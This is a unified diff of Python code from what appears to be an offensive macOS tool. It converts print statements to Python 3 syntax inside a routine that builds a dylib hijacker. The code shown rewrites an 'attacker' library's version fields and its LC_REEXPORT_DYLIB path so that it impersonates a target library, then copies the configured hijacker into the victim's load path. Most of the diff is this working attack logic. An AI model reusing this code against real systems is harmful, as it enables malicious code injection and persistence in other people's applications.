@@ -365,7 +365,7 @@ def run(attackerDYLIB):
         except Exception, e:
 
             #err msg
-            print 'EXCEPTION (configuring version info): %%s' %% e
+            print('EXCEPTION (configuring version info): %%s' %% e)
 
 
         return True
@@ -378,7 +378,7 @@ def run(attackerDYLIB):
         try:
 
             #dbg msg
-            print ' [+] parsing \\'%%s\\' to extract faux re-export info' %% (os.path.split(attackerDYLIB)[1])
+            print(' [+] parsing \\'%%s\\' to extract faux re-export info' %% (os.path.split(attackerDYLIB)[1]))
 
             #open attacker's .dylib
             fileHandle = open(attackerDYLIB, 'rb+')
@@ -389,13 +389,13 @@ def run(attackerDYLIB):
             if not reExportOffsets or not len(reExportOffsets):
 
                 #err msg
-                print 'ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1])
+                print('ERROR: failed to find \\'LC_REEXPORT_DYLIB\\' load command in %%s' %% (os.path.split(attackerDYLIB)[1]))
 
                 #bail
                 return False
 
             #dbg msg
-            print '     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %%s' %% (reExportOffsets)
+            print('     found \\'LC_REEXPORT_DYLIB\\' load command at offset(s): %%s' %% (reExportOffsets))
 
             '''
             struct dylib { union lc_str name; uint_32 timestamp; uint_32 current_version; uint_32 compatibility_version; };
@@ -415,13 +415,13 @@ def run(attackerDYLIB):
                 commandSize = struct.unpack('<L', fileHandle.read(4))[0]
 
                 #dbg msg
-                print '     extracted LC command size: 0x%%x' %% (commandSize)
+                print('     extracted LC command size: 0x%%x' %% (commandSize))
 
                 #read in path offset
                 pathOffset = struct.unpack('<L', fileHandle.read(4))[0]
 
                 #dbg msg
-                print '     extracted path offset: 0x%%x' %% (pathOffset)
+                print('     extracted path offset: 0x%%x' %% (pathOffset))
 
                 #seek to path offset
                 fileHandle.seek(reExportOffset + pathOffset, io.SEEK_SET)
@@ -431,7 +431,7 @@ def run(attackerDYLIB):
                 pathSize = commandSize - (fileHandle.tell() - reExportOffset)
 
                 #dbg msg
-                print '     computed path size: 0x%%x' %% (pathSize)
+                print('     computed path size: 0x%%x' %% (pathSize))
 
                 #read out path
                 data = targetDYLIB + '\\0' * (pathSize - len(targetDYLIB))
@@ -447,7 +447,7 @@ def run(attackerDYLIB):
                 fileHandle.close()
 
                 #dbg msg
-                print ' [+] updated embedded re-export'
+                print(' [+] updated embedded re-export')
 
                 #wrap
 
@@ -455,7 +455,7 @@ def run(attackerDYLIB):
         except Exception, e:
 
             #err msg
-            print 'EXCEPTION (configuring re-exports): %%s' %% e
+            print('EXCEPTION (configuring re-exports): %%s' %% e)
 
             #bail
             return False
@@ -469,7 +469,7 @@ def run(attackerDYLIB):
         if not configureVersions(attackerDYLIB, targetDYLIB):
 
             #err msg
-            print 'ERROR: failed to configure version info'
+            print('ERROR: failed to configure version info')
 
             #bail
             return False
@@ -479,7 +479,7 @@ def run(attackerDYLIB):
         if not configureReExport(attackerDYLIB, targetDYLIB):
 
             #err msg
-            print 'ERROR: failed to configure re-export'
+            print('ERROR: failed to configure re-export')
 
             #bail
             return False
@@ -500,14 +500,14 @@ def run(attackerDYLIB):
     configuredDYLIB = os.path.split(attackerDYLIB)[0]+'/' + os.path.split(targetDYLIB)[1]
 
     #dbg msg
-    print ' [+] configuring %%s to hijack %%s' %% (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1])
+    print(' [+] configuring %%s to hijack %%s' %% (os.path.split(attackerDYLIB)[1], os.path.split(targetDYLIB)[1]))
 
     #check prereqs
     # ->i.e. sanity checks
     if not checkPrereqs(attackerDYLIB, targetDYLIB):
 
         #err msg
-        print 'ERROR: prerequisite check failed\\n'
+        print('ERROR: prerequisite check failed\\n')
 
         #bail
         return ""
@@ -516,13 +516,13 @@ def run(attackerDYLIB):
     if not configure(attackerDYLIB, targetDYLIB):
 
         #err msg
-        print 'ERROR: failed to configure %%s\\n' %% (os.path.split(targetDYLIB)[1])
+        print('ERROR: failed to configure %%s\\n' %% (os.path.split(targetDYLIB)[1]))
 
         #bail
         return ""
 
     #dbg msg
-    print ' [+] copying configured .dylib to %%s' %% (configuredDYLIB)
+    print(' [+] copying configured .dylib to %%s' %% (configuredDYLIB))
 
     #make a (local) copy w/ name
     shutil.copy2(attackerDYLIB, configuredDYLIB)
@@ -537,7 +537,7 @@ def run(attackerDYLIB):
     os.remove(configuredDYLIB)
     #dbg msg
     
-    print '\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath)
+    print('\\nHijacker created, renamed to %%s, and copied to %%s' %% (configuredDYLIB,vrpath))
 
 import base64
 import uuid
